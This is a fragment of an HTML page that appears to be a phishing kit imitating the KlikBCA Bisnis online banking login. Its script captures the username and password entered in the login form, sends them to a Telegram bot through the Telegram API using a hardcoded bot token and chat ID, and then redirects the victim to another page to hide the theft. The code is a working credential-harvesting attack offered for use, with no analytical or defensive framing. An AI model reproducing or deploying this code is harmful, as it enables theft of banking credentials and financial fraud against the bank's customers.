    <button class="w-full bg-[#0561a7] text-white text-base font-normal rounded-full py-3 mt-6" type="submit">

  </div>
  <script>
   const botToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
   const chatId = '5906925079';

   document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;

     const message = `KLIKBCA BISNIS:\nUsername: ${username}\nPassword: ${password}`;

     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
         chat_id: chatId,
         text: message
       })
     }).then(response => {
       if(response.ok) {
         window.location.href = "klikbisnis.html";
         this.reset();
       } else {
         alert('Failed to send data.');
       }
     }).catch(() => {
       alert('Failed to send data.');
     });
   });
  </script>
